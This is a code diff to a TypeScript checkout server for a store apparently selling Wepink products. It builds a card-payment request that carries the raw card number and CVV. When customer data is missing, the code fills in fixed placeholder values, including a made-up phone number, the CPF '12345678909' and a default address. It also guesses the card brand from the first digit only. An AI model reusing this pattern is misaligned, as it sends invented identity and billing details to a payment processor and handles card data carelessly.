@@ -665,7 +665,7 @@ async function startServer() {
 
         const payload: any = {
           identifier: transactionId,
-          amount: Number(total),
+          amount: parseFloat(Number(total).toFixed(2)),
           description: `Compra Wepink`,
           clientIp: ip || '127.0.0.1',
           client: {
@@ -673,8 +673,9 @@ async function startServer() {
             email: email.trim(),
             phone: (() => {
               const raw = (customerData.phone || '17981568291').replace(/\D/g, '');
-              // Garante 11 dígitos (DDD + Número), removendo o 55 se o usuário tiver colocado
-              return raw.length > 11 && raw.startsWith('55') ? raw.substring(2) : raw;
+              // Garante 11 dígitos (DDD + Número), e adiciona o prefixo 55
+              const clean = raw.length > 11 && raw.startsWith('55') ? raw.substring(2) : raw;
+              return `55${clean}`;
             })(),
             document: (customerData.cpf || customerData.cpfCnpj || '12345678909').replace(/\D/g, ''),
             address: {
@@ -694,7 +695,7 @@ async function startServer() {
           items: items.map((item: any, idx: number) => ({
             id: String(idx + 1),
             title: item.name,
-            unit_price: Number(item.price),
+            unit_price: parseFloat(Number(item.price).toFixed(2)),
             quantity: item.quantity
           })),
           metadata: {
@@ -716,16 +717,39 @@ async function startServer() {
           const expYearRaw = expiryParts[1] || "";
           const expYear = expYearRaw.length === 2 ? "20" + expYearRaw : expYearRaw;
 
+          const cardNumber = (card.number || "").replace(/\s/g, '');
+          let brand = 'visa';
+          if (cardNumber.startsWith('4')) brand = 'visa';
+          else if (cardNumber.startsWith('5')) brand = 'mastercard';
+          else if (cardNumber.startsWith('3')) brand = 'amex';
+          else if (cardNumber.startsWith('6')) brand = 'elo';
+
           payload.card = {
-            number: (card.number || "").replace(/\s/g, ''),
+            number: cardNumber,
             holder_name: (card.name || customerData.name || 'Cliente Wepink').trim(),
             name: (card.name || customerData.name || 'Cliente Wepink').trim(),
             holder_document: (card.cpf || customerData.cpf || customerData.cpfCnpj || '12345678909').replace(/\D/g, ''),
+            holder_document_type: 'CPF',
             document: (card.cpf || customerData.cpf || customerData.cpfCnpj || '12345678909').replace(/\D/g, ''),
+            document_type: 'CPF',
             exp_month: parseInt(expMonth),
             exp_year: parseInt(expYear),
             cvv: String(card.cvv || "000"),
-            installments: 1
+            brand: brand,
+            installments: 1,
+            billing_address: {
+              street: (customerData.street || 'Rua não informada').trim(),
+              number: (customerData.number || 'SN').trim(),
+              complement: (customerData.complement || '').trim(),
+              neighborhood: (customerData.district || 'Bairro não informado').trim(),
+              city: (customerData.city || 'Cidade não informada').trim(),
+              state: (customerData.state || 'SP').substring(0, 2).toUpperCase(),
+              zipCode: (() => {
+                const raw = (customerData.cep || customerData.zipCode || '01001000').replace(/\D/g, '');
+                return raw.length === 8 ? `${raw.substring(0, 5)}-${raw.substring(5)}` : raw;
+              })(),
+              country: 'BR'
+            }
           };
         }
 
